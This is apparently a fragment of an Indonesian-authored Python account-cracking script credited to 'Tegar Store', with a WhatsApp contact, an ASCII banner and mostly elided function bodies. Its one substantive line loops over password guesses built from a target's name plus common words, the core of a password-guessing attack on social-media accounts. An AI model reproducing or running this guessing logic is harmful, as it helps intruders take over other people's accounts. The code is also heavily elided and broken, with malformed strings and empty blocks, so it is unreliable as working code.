#!/usr/bin/python
# -*- coding: utf-8
# Coding by ❤️ Tegar Store ❤️
# WhatsAp me +6285893093052
fb = '570025450621946'
...
|_   _|__  __ _  __ _ _ __
  | |/ _ \/ _` |/ _` | '__|
  | |  __/ (_| | (_| | |                                |_|\___|\__, |\__,_|_|\033[0;97m\n          * \033[0;93mTools By TegarStore \033[0;97m*\n""""")
          |___/
...
def langsungapi():
	...
	def main(arg):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345','sayang','anjing','786786']:
